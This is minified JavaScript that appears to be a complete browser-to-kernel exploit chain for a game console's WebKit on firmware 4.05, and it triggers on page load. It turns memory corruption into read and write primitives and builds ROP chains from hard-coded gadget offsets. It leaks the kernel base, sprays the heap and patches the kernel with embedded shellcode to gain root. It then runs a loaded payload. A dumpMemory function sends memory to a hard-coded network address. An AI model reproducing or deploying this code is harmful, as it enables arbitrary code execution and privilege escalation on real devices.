var fix=[3049,2425393152,2425393296,2425393296,8567125,2303246336,1096237541,1096106326,2202555220,839850220,2312472905,1689864384,2004054121,1224736768,1092675009,131260,3305720064,3501559117,1241501460,2320539021,2169044995,51073221,2257406209,1906896,13009225,1207966999,1220560265,2902458529,222,1166624768,2290698440,224,4034971464,0,1207959552,16285895,0,451608576,8658703,0,1290701132,2336817033,3506421829,32277313,45754228,1275068416,2160062089,1090519041,2370361087,28477,3347663104,835094856,1288961984,1976073529,3828434375,3363146568,1597869384,822083584,265551808,17439,41288,57005,2302935040,1032669414,92,538217290,147096393,3556753457,2164031817,1962934273,1032669399,96,3556753457,415531848,1096532017,1096630620,1566523742,2425393347,1869376577,807418467,2020353400,1649344522,1952671082,1836401696,2016419952,175664165,0,0,1650803772,540960629,1701470799,723547235,628633632,980955952,628633632,686188,1650803772,540960629,1953723722,1919895072,1952981050,980643956,2004299567,1870212727,1651864693,1868770917,1635200877,1063805812,1247165814,1835815495,1282171187,2649];window.syscalls=[],window.memcalls=[],window.syscallMap={4.05:{3:9712,4:10032,5:9584,6:9424,20:1776,23:1808,24:1840,54:2416,97:2928,98:9456,203:4144,477:10160,557:6896,558:6928,601:7792,632:8656,633:8688,634:8720}},window.syscallnames={sys_exit:1,sys_fork:2,sys_read:3,sys_write:4,sys_open:5,sys_close:6,sys_wait4:7,sys_unlink:10,sys_chdir:12,sys_chmod:15,sys_getpid:20,sys_setuid:23,sys_getuid:24,sys_geteuid:25,sys_recvmsg:27,sys_sendmsg:28,sys_recvfrom:29,sys_accept:30,sys_getpeername:31,sys_getsockname:32,sys_access:33,sys_chflags:34,sys_fchflags:35,sys_sync:36,sys_kill:37,sys_stat:38,sys_getppid:39,sys_dup:41,sys_pipe:42,sys_getegid:43,sys_profil:44,sys_getgid:47,sys_getlogin:49,sys_setlogin:50,sys_sigaltstack:53,sys_ioctl:54,sys_reboot:55,sys_revoke:56,sys_execve:59,sys_execve:59,sys_msync:65,sys_munmap:73,sys_mprotect:74,sys_madvise:75,sys_mincore:78,sys_getgroups:79,sys_setgroups:80,sys_setitimer:83,sys_getitimer:86,sys_getdtablesize:89,sys_dup2:90,sys_fcntl:92,sys_select:93,sys_fsync:95,sys_setpriority:96,sys_socket:97,sys_connect:98,sys_getpriority:100,sys_send:101,sys_recv:102,sys_bind:104,sys_setsockopt:105,sys_listen:106,sys_recvmsg:113,sys_sendmsg:114,sys_gettimeofday:116,sys_getrusage:117,sys_getsockopt:118,sys_readv:120,sys_writev:121,sys_settimeofday:122,sys_fchmod:124,sys_recvfrom:125,sys_setreuid:126,sys_setregid:127,sys_rename:128,sys_flock:131,sys_sendto:133,sys_shutdown:134,sys_socketpair:135,sys_mkdir:136,sys_rmdir:137,sys_utimes:138,sys_adjtime:140,sys_getpeername:141,sys_setsid:147,sys_sysarch:165,sys_setegid:182,sys_seteuid:183,sys_fstat:189,sys_lstat:190,sys_pathconf:191,sys_fpathconf:192,sys_getrlimit:194,sys_setrlimit:195,sys_getdirentries:196,sys___sysctl:202,sys_mlock:203,sys_munlock:204,sys_futimes:206,sys_poll:209,sys_clock_gettime:232,sys_clock_settime:233,sys_clock_getres:234,sys_ktimer_create:235,sys_ktimer_delete:236,sys_ktimer_settime:237,sys_ktimer_gettime:238,sys_ktimer_getoverrun:239,sys_nanosleep:240,sys_rfork:251,sys_issetugid:253,sys_getdents:272,sys_preadv:289,sys_pwritev:290,sys_getsid:310,sys_aio_suspend:315,sys_mlockall:324,sys_munlockall:325,sys_sched_setparam:327,sys_sched_getparam:328,sys_sched_setscheduler:329,sys_sched_getscheduler:330,sys_sched_yield:331,sys_sched_get_priority_max:332,sys_sched_get_priority_min:333,sys_sched_rr_get_interval:334,sys_utrace:335,sys_sigprocmask:340,sys_sigprocmask:340,sys_sigsuspend:341,sys_sigpending:343,sys_sigtimedwait:345,sys_sigwaitinfo:346,sys_kqueue:362,sys_kevent:363,sys_uuidgen:392,sys_sendfile:393,sys_fstatfs:397,sys_ksem_close:400,sys_ksem_post:401,sys_ksem_wait:402,sys_ksem_trywait:403,sys_ksem_init:404,sys_ksem_open:405,sys_ksem_unlink:406,sys_ksem_getvalue:407,sys_ksem_destroy:408,sys_sigaction:416,sys_sigreturn:417,sys_getcontext:421,sys_setcontext:422,sys_swapcontext:423,sys_sigwait:429,sys_thr_create:430,sys_thr_exit:431,sys_thr_self:432,sys_thr_kill:433,sys_ksem_timedwait:441,sys_thr_suspend:442,sys_thr_wake:443,sys_kldunloadf:444,sys__umtx_op:454,sys__umtx_op:454,sys_thr_new:455,sys_sigqueue:456,sys_thr_set_name:464,sys_rtprio_thread:466,sys_pread:475,sys_pwrite:476,sys_mmap:477,sys_lseek:478,sys_truncate:479,sys_ftruncate:480,sys_thr_kill2:481,sys_shm_open:482,sys_shm_unlink:483,sys_cpuset_getid:486,sys_cpuset_getaffinity:487,sys_cpuset_setaffinity:488,sys_openat:499,sys_pselect:522,sys_regmgr_call:532,sys_jitshm_create:533,sys_jitshm_alias:534,sys_dl_get_list:535,sys_dl_get_info:536,sys_dl_notify_event:537,sys_evf_create:538,sys_evf_delete:539,sys_evf_open:540,sys_evf_close:541,sys_evf_wait:542,sys_evf_trywait:543,sys_evf_set:544,sys_evf_clear:545,sys_evf_cancel:546,sys_query_memory_protection:47,sys_batch_map:548,sys_osem_create:549,sys_osem_delete:550,sys_osem_open:551,sys_osem_close:552,sys_osem_wait:553,sys_osem_trywait:554,sys_osem_post:555,sys_osem_cancel:556,sys_namedobj_create:557,sys_namedobj_delete:558,sys_set_vm_container:559,sys_debug_init:560,sys_suspend_process:561,sys_resume_process:562,sys_opmc_enable:563,sys_opmc_disable:564,sys_opmc_set_ctl:565,sys_opmc_set_ctr:566,sys_opmc_get_ctr:567,sys_budget_create:568,sys_budget_delete:569,sys_budget_get:570,sys_budget_set:571,sys_virtual_query:572,sys_mdbg_call:573,sys_sblock_create:574,sys_sblock_delete:575,sys_sblock_enter:576,sys_sblock_exit:577,sys_sblock_xenter:578,sys_sblock_xexit:579,sys_eport_create:580,sys_eport_delete:581,sys_eport_trigger:582,sys_eport_open:583,sys_eport_close:584,sys_is_in_sandbox:585,sys_dmem_container:586,sys_get_authinfo:587,sys_mname:588,sys_dynlib_dlopen:589,sys_dynlib_dlclose:590,sys_dynlib_dlsym:591,sys_dynlib_get_list:592,sys_dynlib_get_info:593,sys_dynlib_load_prx:594,sys_dynlib_unload_prx:595,sys_dynlib_do_copy_relocations:596,sys_dynlib_prepare_dlclose:597,sys_dynlib_get_proc_param:598,sys_dynlib_process_needed_and_relocate:599,sys_sandbox_path:600,sys_mdbg_service:601,sys_randomized_path:602,sys_rdup:603,sys_dl_get_metadata:604,sys_workaround8849:605,sys_is_development_mode:606,sys_get_self_auth_info:607,sys_dynlib_get_info_ex:608,sys_budget_get_ptype:610,sys_budget_getid:609,sys_get_paging_stats_of_all_threads:611,sys_get_proc_type_info:612,sys_get_resident_count:613,sys_prepare_to_suspend_process:614,sys_get_resident_fmem_count:615,sys_thr_get_name:616,sys_set_gpo:617,sys_thr_suspend_ucontext:632,sys_thr_resume_ucontext:633,sys_thr_get_ucontext:634};var _dview,ua=navigator.userAgent;function zeroFill(s,e){return 0<(e-=s.toString().length)?new Array(e+(/\./.test(s)?2:1)).join("0")+s:s+""}function int64(s,e){return this.low=s>>>0,this.hi=e>>>0,this.add32inplace=function(s){var e=((this.low>>>0)+s&4294967295)>>>0,t=this.hi>>>0;e<this.low&&t++,this.hi=t,this.low=e},this.add32=function(s){var e=((this.low>>>0)+s&4294967295)>>>0,t=this.hi>>>0;return e<this.low&&t++,new int64(e,t)},this.sub32=function(s){var e=((this.low>>>0)-s&4294967295)>>>0,t=this.hi>>>0;return e>this.low&4294967295&&t--,new int64(e,t)},this.sub32inplace=function(s){var e=((this.low>>>0)-s&4294967295)>>>0,t=this.hi>>>0;e>this.low&4294967295&&t--,this.hi=t,this.low=e},this.and32=function(s){return new int64(this.low&s,this.hi)},this.and64=function(s,e){return new int64(this.low&s,this.hi&e)},this.toString=function(s){var e=(this.low>>>0).toString(16),t=(this.hi>>>0).toString(16);return 0==this.hi?e:t+(e=zeroFill(e,8))},this.toPacked=function(){return{hi:this.hi,low:this.low}},this.setPacked=function(s){return this.hi=s.hi,this.low=s.low,this},this}window.postexploit=function(l){var s=ua.substring(ua.indexOf("5.0 (")+19,ua.indexOf(") Apple"));document.getElementById("clck").style.display="none";var e=function(s){document.getElementById("console").innerHTML+=s+"\n"};window.nogc=[],e("=== Exploit Successful ==="),l.leakFunction=function(s){var e=l.leakval(s);return l.read8(e.add32(24)).add32(32)};var t=l.read8(l.leakFunction(parseFloat)).add32(0);if(t.low&=-4096,t.sub32inplace(348160),moduleBaseAddresses.libSceWebKit2=t,generateBasicImportMap(),null==window.basicImportMap[s])throw new Error("System may be vulnerable but does not have a valid import map!");window.basicImports=window.basicImportMap[s];var i=l.read8(t.add32(41064256));i.low&=-4096,i.sub32inplace(221184),moduleBaseAddresses.libSceLibcInternal=i;var _=l.read8(window.basicImports.__stack_chk_fail_ptr);if(_.sub32inplace(window.basicImports.__stack_chk_fail_offset),moduleBaseAddresses.libkernel=_,generateGadgetMap(),null==gadgetMap[s])throw new Error("System may be vulnerable but does not have a valid gadget map!");window.gadgets=gadgetMap[s],null!=syscallMap[s]?window.syscalls=syscallMap[s]:alert("Your system does not have a valid system call map! The exploit will still work but calling syscalls will not function properly...");for(var o=l.leakFunction(parseFloat),d=[],a=0;a<32767;a++)d[a]=1094778880|a;var r=new Uint32Array(4096),h=l.read8(l.leakval(r).add32(40));if((r[0]=322376503)!=l.read4(h))throw new Error("Stack frame is not aligned!");function n(s){var e=new Uint8Array(65536+s);window.nogc.push(e);var t=l.read8(l.leakval(e).add32(40));return t.backing=e,t}function c(s){for(var e=new Uint8Array(s.length+1),t=0;t<s.length;t++)e[t]=255&s.charCodeAt(t);return window.nogc.push(e),l.read8(l.leakval(e).add32(40))}window.dont_tread_on_me=[r],l.loadchain=function(t){var a=0,r=0,i=0,n={length:{valueOf:function(){i=l.read8(a);var s=a,e=t.count;return t.push64(a,i),t.push64(a.add32(8),r),t.runtime&&(s=t.runtime(a)),t.push(window.gadgets["pop rsp"]),t.push(s),t.count=e,l.write8(a,window.gadgets["pop rsp"]),l.write8(a.add32(8),t.ropChainPtr),0}}};return function(){(function(){}).apply(null,d);var s=l.read8(o);l.write8(o,window.gadgets["mov rax, rdi"]);var e,t=l.leakval(parseFloat()),i=new int64(1094795585,4294901760);return function(){var s=l.read8(t.add32(256));if(4294901760!=s.hi||1094778880!=(4294901760&s.low))throw new Error("Stack frame corrupted!")}.apply(null,d),l.write8(h,h.add32(256)),l.write8(h.add32(304),window.basicImports.setjmp),l.write8(o,window.gadgets["jmp addr"]),function(){}.apply(null,d),l.write8(t.add32(24),h),l.leakval(parseFloat()),a=l.read8(h.add32(16)),r=l.read8(a.add32(8)),e=Array.prototype.splice.apply(n),l.write8(t.add32(24),i),l.write8(t.add32(24),s),l.leakval(e)}.apply(null,d)},l.call=function(s,e,t,i,a,r,n){var o,d=new rop(l,void 0);if(d.call(s,e,t,i,a,r,n),d.push(window.gadgets["pop rdi"]),d.push(d.ropChainEndPtr.sub32(8)),d.push(window.gadgets["mov qword ptr [rdi], rax"]),d.push(window.gadgets["pop rax"]),d.push(l.leakval(1094795842)),1094795842!=d.run().low)throw new Error("Unexpected ROP behaviour");return 4294967295==(o=l.read8(d.ropChainEndPtr.sub32(8)).add32(0)).low&&4294967295==o.hi&&(o=l.read8(_.add32(511216)),o=-1),o},l.syscall=function(s,e,t,i,a,r,n){if("string"==typeof s&&(s=window.syscallnames[s]),"number"!=typeof s)throw new Error("System call map does not contain an index for this syscall!");var o=window.syscalls[s];if(null==o)throw new Error("System call map does not contain an index for this syscall!");return l.call(_.add32(o),e,t,i,a,r,n)},l.writeString=function(s,e){for(var t=0;t<e.length;t++){var i=l.read4(s.add32(t));i&=4294901760,i|=e.charCodeAt(t),l.write4(s.add32(t),i)}},l.readString=function(s){for(var e=l.read4(s),t="";255&e;)t+=String.fromCharCode(255&e),s.add32inplace(1),e=l.read4(s);return t},l.socket=function(){return l.syscall("sys_socket",2,1,0)},l.connect=function(s,e,t){for(var i=new Uint32Array(16),a=l.read8(l.leakval(i).add32(40)),r=e.split("."),n=0;n<4;n++)r[n]=parseInt(r[n]);return i[0]|=(t>>8&255)<<16|t<<24|512,i[1]=r[3]<<24|r[2]<<16|r[1]<<8|r[0],i[2]=0,i[3]=0,l.syscall("sys_connect",s,a,16)},l.writeSocket=function(s,e,t){return l.syscall("sys_write",s,e,t)},l.closeSocket=function(s){return l.syscall("sys_close",s)},window.dumpMemory=function(s,e){var t=l.socket();if(0!=l.connect(t,"192.168.0.19",9030))return-1;l.writeSocket(t,s,e),l.closeSocket(t)};e("=== Checking kexploit status ===");var p=l.syscall("sys_setuid",0);if(0==p&&e("Status: Kernel Patched!"),0!=p){e("Status: Kernel Not Patched..."),e("=== Starting Kernel Exploit Chain ==="),e("Allocating Buffers...");var y=n(8),u=n(8),w=n(8),g=n(8),f=n(128),m=(n(8),n(8),n(384)),v=n(176),k=(y=n(8),n(8)),b=n(1216),x=n(8);l.call(_.add32(71024),x,0,window.gadgets.infloop,b,c("leakThr"));e("Calculating ASLR and Object Base..."),l.write8(g,l.syscall("sys_namedobj_create",c("debug"),57005,20480));var S=new saferop(l,void 0);if(S.call(_.add32(window.syscalls[window.syscallnames.sys_thr_suspend_ucontext]),l.read4(l.read8(x))),S.call(_.add32(window.syscalls[window.syscallnames.sys_open]),c("/dev/dipsw"),0,0),S.saveReturnValue(k),S.call(_.add32(window.syscalls[window.syscallnames.sys_thr_get_ucontext]),l.read4(l.read8(x)),b),S.run(),y=l.read8(b.add32(296)).sub32(1089174),u=l.read8(b.add32(304)),w=l.read8(b.add32(32)),16383&y.low)return alert("Bad leak! Terminating."),!1;e("Kernel base: 0x"+y),e("Object leak: 0x"+u),l.write8(f.add32(4),u),l.writeString(f.add32(40),"debug"),e("Building Kernel ROP Chain...");var P=n(512),C=new krop(l,P);C.push(window.gadgets["pop rax"]),C.push(2147745843),C.push(y.add32(3707705)),C.write64(u.add32(184),y.add32(26371408));var K=new int64(934756663,826654769);C.write64(y.add32(3264476),K);var A=new int64(0,4169501512),G=new int64(32233,1922076672);C.write64(y.add32(970902),A),C.write64(y.add32(970939),G);var I=new int64(233,2336788480),W=new int64(2428747825,2425393296);C.write64(y.add32(1354461),I),C.write64(y.add32(929184),W);var j=new int64(0,1);C.write64(y.add32(15825312),2),C.write64(y.add32(15825320),y.add32(415568)),C.write64(y.add32(15825352),j);var F=new int64(184,2244184320);C.write64(y.add32(547760),F),C.push(window.gadgets["pop rax"]),C.push(y.add32(26556128)),C.push(window.gadgets["mov rax, qword ptr [rax]"]),C.push(window.gadgets["pop rdi"]),C.push(u.add32(80)),C.push(window.gadgets["mov qword ptr [rdi], rax"]),C.push(window.gadgets["pop rax"]),C.push(w.add32(960)),C.push(window.gadgets["pop rcx"]),C.push(window.gadgets["pop rsp"]),C.push(window.gadgets["push rax; jmp rcx"]),e("KROP chain size: "+C.count),e("Creating Fake Object..."),l.write8(m.add32(8),4),l.write8(m.add32(72),420),l.write8(m.add32(88),68719476736),l.write8(m.add32(96),4),l.write8(m.add32(104),y.add32(26371576)),l.write8(m.add32(160),u.add32(224)),l.write8(m.add32(184),v),l.write8(m.add32(192),65536),l.write8(m.add32(200),1),l.write8(m.add32(224),window.gadgets.ret),l.write8(m.add32(240),u),l.write8(m.add32(248),P),l.write8(v.add32(56),i.add32(688751)),e("Freeing the object!");var B=new saferop(l,void 0);B.call(_.add32(window.syscalls[window.syscallnames.sys_mdbg_service]),1,f,0),B.call(_.add32(window.syscalls[window.syscallnames.sys_namedobj_delete]),l.read8(g),20480),e("Spraying the heap!");for(a=0;a<500;a++)B.call(_.add32(window.syscalls[window.syscallnames.sys_ioctl]),3735928559,2166358016,m);B.run(),e("Triggering kernel code execution"),l.syscall("sys_ioctl",l.read8(k),2166358016,m),e("Allocating executable memory for fix payload...");var E=new int64(3735879680,0),M=l.syscall("sys_mmap",E,65536,7,4096,-1,0),q=new memory(l,M),z=q.allocate(8),O=q.allocate(512);l.write8(z,u);for(a=0;a<fix.length;a++)l.write4(O.add32(4*a),fix[a]);e("Running fix payload...");var U=new saferop(l,void 0);U.push(window.gadgets["pop rax"]),U.push(11),U.push(window.gadgets["pop rdi"]),U.push(O),U.push(_.add32(10698)),U.run()}e("=== Verifying kexploit patches ==="),e("setuid(0): "+l.syscall("sys_setuid",0)),e("getuid():  "+l.syscall("sys_getuid")),e("=== Launching Payload ===");var R=new int64(639631360,9),L=l.syscall("sys_mmap",R,2097152,7,4096,-1,0);if("926200000"==L){l.call(_.add32(304),R,0,2097144);for(a=0;a<payload.length;a++)l.write4(R.add32(4*a),payload[a]);l.write8(R.add32(2097144),_.add32(10695));var T=n(8),V=n(256);l.writeString(V,"payload"),e("scePthreadCreate: 0x"+l.call(_.add32(71024),T,0,R,0,V)),e("thread: 0x"+l.read8(T)),e("=== Done ===")}else e("Failed to allocate payload"),e(L)};var memPressure=new Array(400),stackFrame=[],frameIndex=0,stackPeek=0,doGarbageCollection=function(){for(var s=0;s<memPressure.length;s++)memPressure[s]=new Uint32Array(65536);for(s=0;s<memPressure.length;s++)memPressure[s]=0};function peek_stack(){var s,e,t;e=65535,arguments.length={valueOf:function(){return t=e,e=1,t}};var i=arguments;return function(){(function(){(function(){s=arguments[65280]}).apply(void 0,i)}).apply(void 0,stackFrame)}.apply(void 0,stackFrame),stackPeek=s}function poke_stack(s){stackFrame[frameIndex]=s,function(){(function(){(function(){}).apply(null,stackFrame)}).apply(null,stackFrame)}.apply(null,stackFrame),stackFrame[frameIndex]=""}function run(){try{for(var s=0;s<65535;s++)stackFrame[s]=s;if(poke_stack(frameIndex=0),null==peek_stack())throw"System is not vulnerable!";poke_stack(frameIndex=0),peek_stack(),frameIndex=stackPeek,poke_stack(16705);for(var e=0;e<8;e++);if(peek_stack(),16705!=stackPeek)throw"Couldn't align stack frame to stack!";var t=new Array(4096);for(s=0;s<4096;s++){t[s]=[];for(var i=0;i<64;i++)t[s][i]=1111638594;t[s].unshift(t[s].shift())}var a=new Array(256);for(s=0;s<256;s++){if(a[s]=[1],!(3&s))for(i=0;i<8;i++)a[s][i]=1128481603;a[s].unshift(a[s].shift())}var r=new Array(1024);for(s=0;s<1024;s++){if(r[s]=[2],!(3&s))for(i=0;i<128;i++)r[s][i]=1128481603;r[s].unshift(r[s].shift())}var n=[];for(s=0;s<128;s++)n[s]=1111621632;poke_stack(n);for(i=r=a=n=0;i<4;i++)doGarbageCollection();peek_stack(),n=stackPeek;for(s=stackPeek=0;s<4096;s++)for(i=0;i<128;i++)if((t[s][i]=2147483647)==n.length){var o=s;for(s=0;s<o;s++)t[s]=0;for(s=o+1;s<4096;s++)t[s]=0;doGarbageCollection();var d=new Array(131072),l=new ArrayBuffer(4096);for(s=0;s<131072;s++)d[s]=s;var _=new Array(128);for(s=0;s<131072;s++)d[s]=new Uint32Array(l);var h=65536,c=new int64(0,0),p=new int64(0,0);for(new int64(0,0);;){var y=n[h];n[h]=4919;for(s=0;s<131072;s++)if(d[s]&&4096!=d[s].byteLength){n[h]=y;var u=d[s];_=[1337];n[h-5]=_,c.low=u[2],c.hi=u[3],c.keep_gc=_,n[h-5]=n[h-2],t[o][i]=0,p.low=u[4],p.hi=u[5],u[4]=u[12],u[5]=u[13],u[14]=64;var w=void 0;for(i=0;i<131072;i++)if(64==d[i].length){w=d[i];break}if(!w)throw"Could not find slave for write primitive!";u[4]=c.low,u[5]=c.hi,_[0]=n;var g=new int64(w[0],w[1]);u[4]=g.low,u[5]=g.hi,w[2]=0,d=n=w[3]=0,u[4]=p.low,u[5]=p.hi;var f=function(s){u[4]=c.low,u[5]=c.hi,_[0]=s;var e=new int64(w[0],w[1]);return w[0]=1337,w[1]=4294901760,u[4]=p.low,u[5]=p.hi,e},m=function(s){u[4]=c.low,u[5]=c.hi,w[0]=s.low,w[1]=s.hi;s=_[0];return w[0]=1337,w[1]=4294901760,u[4]=p.low,u[5]=p.hi,s},v=function(s){u[4]=s.low,u[5]=s.hi;var e=new int64(w[0],w[1]);return u[4]=p.low,u[5]=p.hi,e};if(4919!=m(f(4919)))throw"Primitive is broken, jsvalue leaked does not match jsvalue created!";var k=v(f([1,2,3,4,5,6,7,8]).add32(8));if(0==k.low&&0==k.hi||1!=m(v(k)))throw"Primitive is broken, either butterfly address is null or object is not a valid jsvalue!";return window.postexploit&&window.postexploit({read4:function(s){u[4]=s.low,u[5]=s.hi;var e=w[0];return u[4]=p.low,u[5]=p.hi,e},read8:v,write4:function(s,e){u[4]=s.low,u[5]=s.hi,w[0]=e,u[4]=p.low,u[5]=p.hi},write8:function(s,e){u[4]=s.low,u[5]=s.hi,null==e&&(e=new int64(0,0)),e instanceof int64||(e=new int64(e,0)),w[0]=e.low,w[1]=e.hi,u[4]=p.low,u[5]=p.hi},leakval:f,createval:m}),2}n[h]=y,h++}}return 1}catch(s){alert(s)}}window.onload=function(){run()},window.gadgetMap=[],window.basicImportMap=[];var generateBasicImportMap=function(){window.basicImportMap={4.05:{setjmp:getGadget("libSceWebKit2",624),__stack_chk_fail_ptr:getGadget("libSceWebKit2",41063008),__stack_chk_fail_offset:53456}}},generateGadgetMap=function(){window.gadgetMap={4.05:{"pop rsi":getGadget("libSceWebKit2",673182),"pop rdi":getGadget("libSceWebKit2",1110465),"pop rax":getGadget("libSceWebKit2",120587),"pop rcx":getGadget("libSceWebKit2",2083483),"pop rdx":getGadget("libSceWebKit2",878176),"pop r8":getGadget("libSceWebKit2",4864781),"pop r9":getGadget("libSceWebKit2",15425423),"pop rsp":getGadget("libSceWebKit2",2141872),"push rax":getGadget("libSceWebKit2",1208060),"add rax, rcx":getGadget("libSceWebKit2",552710),"mov rax, rdi":getGadget("libSceWebKit2",22627),"mov qword ptr [rdi], rax":getGadget("libSceWebKit2",1158615),"mov qword ptr [rdi], rsi":getGadget("libSceWebKit2",4444016),"mov rax, qword ptr [rax]":getGadget("libSceWebKit2",1038477),"jmp addr":getGadget("libSceWebKit2",8726052),infloop:getGadget("libSceWebKit2",285201),"jmp rax":getGadget("libSceWebKit2",1876665),"push rax; jmp rcx":getGadget("libSceWebKit2",4627328),ret:getGadget("libSceWebKit2",200),syscall:getGadget("libSceWebKit2",29791112)}}},moduleBaseAddresses={libkernel:0,libSceWebKit2:0,libSceLibcInternal:0};function getGadget(s,e){return moduleBaseAddresses[s].add32(e)}var memory=function(e,s){return this.basePtr=s,this.dataPtr=0,this.allocate=function(s){if(65536<this.dataPtr||65536<this.dataPtr+s)return-1;var e=this.basePtr.add32(this.dataPtr);return this.dataPtr+=s,e},this.clear=function(){for(var s=0;s<65536;s+=8)e.write8(this.basePtr.add32(s),0)},this.clear(),this},krop=function(e,s){return this.chainPtr=s,this.count=0,this.push=function(s){e.write8(this.chainPtr.add32(8*this.count),s),this.count++},this.write64=function(s,e){this.push(window.gadgets["pop rdi"]),this.push(s),this.push(window.gadgets["pop rax"]),this.push(e),this.push(window.gadgets["mov qword ptr [rdi], rax"])},this},saferop=function(e,s){return this.ropChain=void 0,this.ropChainPtr=void 0,this.ropChainEndPtr=void 0,null==s?(this.ropChain=new Uint32Array(16384),this.ropChainPtr=e.read8(e.leakval(this.ropChain).add32(40))):this.ropChainPtr=s,this.ropChainEndPtr=this.ropChainPtr.add32(65536),this.count=0,this.clear=function(){this.count=0,this.runtime=void 0;for(var s=0;s<16376;s+=8)e.write8(this.ropChainPtr.add32(s),0)},this.getChainIndex=function(){return this.count++,this.count-1},this.push=function(s){e.write8(this.ropChainPtr.add32(8*this.getChainIndex()),s)},this.push64=function(s,e){this.push(window.gadgets["pop rdi"]),this.push(s),this.push(window.gadgets["pop rsi"]),this.push(e),this.push(window.gadgets["mov qword ptr [rdi], rsi"])},this.call=function(s,e,t,i,a,r,n){return null!=e&&(this.push(window.gadgets["pop rdi"]),this.push(e)),null!=t&&(this.push(window.gadgets["pop rsi"]),this.push(t)),null!=i&&(this.push(window.gadgets["pop rdx"]),this.push(i)),null!=a&&(this.push(window.gadgets["pop rcx"]),this.push(a)),null!=r&&(this.push(window.gadgets["pop r8"]),this.push(r)),null!=n&&(this.push(window.gadgets["pop r9"]),this.push(n)),this.push(s),this},this.saveReturnValue=function(s){this.push(window.gadgets["pop rdi"]),this.push(s),this.push(window.gadgets["mov qword ptr [rdi], rax"])},this.run=function(){var s=e.loadchain(this);return this.clear(),s},this},rop=function(e,s){return this.ropChainSize=16384,this.ropChain=void 0,this.ropChainBasePtr=void 0,this.ropChainPtr=void 0,this.ropChainEndPtr=void 0,null==s?(this.ropChain=new Uint32Array(this.ropChainSize/4*2),this.ropChainBasePtr=e.read8(e.leakval(this.ropChain).add32(40)).add32(this.ropChainSize),this.ropChainPtr=this.ropChainBasePtr.add32(8),this.ropChainEndPtr=this.ropChainBasePtr.add32(this.ropChainSize)):(this.ropChainBasePtr=s.add32(0),this.ropChainPtr=s.add32(8),this.ropChainEndPtr=s.add32(this.ropChainSize)),this.count=0,this.clear=function(){this.count=0,this.runtime=void 0;for(var s=0;s<this.ropChainSize-8;s+=8)e.write8(this.ropChainBasePtr.add32(s),0)},this.getChainIndex=function(){return this.count++,this.count-1},this.push=function(s){e.write8(this.ropChainPtr.add32(8*this.getChainIndex()),s)},this.push64=function(s,e){this.push(window.gadgets["pop rdi"]),this.push(s),this.push(window.gadgets["pop rsi"]),this.push(e),this.push(window.gadgets["mov qword ptr [rdi], rsi"])},this.call=function(s,e,t,i,a,r,n){return null!=e&&(this.push(window.gadgets["pop rdi"]),this.push(e)),null!=t&&(this.push(window.gadgets["pop rsi"]),this.push(t)),null!=i&&(this.push(window.gadgets["pop rdx"]),this.push(i)),null!=a&&(this.push(window.gadgets["pop rcx"]),this.push(a)),null!=r&&(this.push(window.gadgets["pop r8"]),this.push(r)),null!=n&&(this.push(window.gadgets["pop r9"]),this.push(n)),this.push(s),this},this.saveReturnValue=function(s){this.push(window.gadgets["pop rdi"]),this.push(s),this.push(window.gadgets["mov qword ptr [rdi], rax"])},this.run=function(){var s=e.loadchain(this);return this.clear(),s},this};